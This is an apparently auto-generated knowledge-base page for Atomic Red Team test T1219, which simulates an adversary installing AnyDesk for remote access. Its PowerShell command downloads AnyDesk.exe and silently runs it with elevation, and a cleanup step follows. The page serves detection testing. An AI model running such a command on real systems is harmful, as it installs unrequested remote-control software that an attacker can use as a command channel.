---
atomic_guid: "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330"
title: "AnyDesk Files Detected Test on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1219"
attack_technique_name: "Remote Access Software"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330"
  - "AnyDesk Files Detected Test on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.

## ATT&CK Mapping

- [[kb/attack/techniques/T1219-remote_access_tools|T1219: Remote Access Tools]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
Start-Process $file1 /S;
```

### Cleanup

```powershell
$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
Remove-Item $file1 -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml)
